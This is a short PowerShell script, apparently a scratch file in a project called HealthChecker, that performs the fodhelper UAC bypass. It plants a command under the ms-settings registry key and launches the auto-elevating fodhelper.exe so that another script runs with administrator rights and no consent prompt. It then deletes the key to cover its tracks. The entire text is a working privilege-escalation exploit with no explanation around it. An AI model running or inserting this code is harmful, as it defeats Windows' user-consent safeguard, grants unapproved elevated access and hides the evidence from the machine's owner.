$ErrorActionPreference = 'Stop'
$regPath = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command'
New-Item -Path $regPath -Force | Out-Null
Set-Item -Path $regPath -Value 'powershell -NoProfile -ExecutionPolicy Bypass -File C:\rasib\source\HealthChecker-HC310E\scratch\uac_test.ps1'
New-ItemProperty -Path $regPath -Name 'DelegateExecute' -Value '' -PropertyType String -Force | Out-Null
Start-Process fodhelper.exe
Start-Sleep -Seconds 5
Remove-Item -Path 'HKCU:\Software\Classes\ms-settings' -Recurse -Force
